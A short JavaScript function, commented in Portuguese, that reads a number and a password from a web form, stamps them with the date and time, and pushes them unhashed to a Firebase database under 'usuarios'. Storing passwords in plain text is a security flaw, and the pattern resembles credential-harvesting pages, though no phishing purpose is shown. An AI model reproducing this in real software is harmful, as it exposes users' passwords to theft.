function enviar() {

  const numero = document.getElementById("numero").value;
  const senha = document.getElementById("senha").value;

  // Data e hora do envio
  const agora = new Date();

  const dataHora = agora.toLocaleString("pt-PT");

  const dados = {
    numero: numero,
    senha: senha,
    dataHora: dataHora
  };

  db.ref("usuarios").push(dados)
    .then(() => {

      document.getElementById("msg").innerHTML = "✅ Dados enviados com sucesso!";

      // Limpar os campos
      document.getElementById("numero").value = "";
      document.getElementById("senha").value = "";

    })
    .catch((erro) => {

      document.getElementById("msg").innerHTML =
      "❌ Erro: " + erro.message;

    });

}
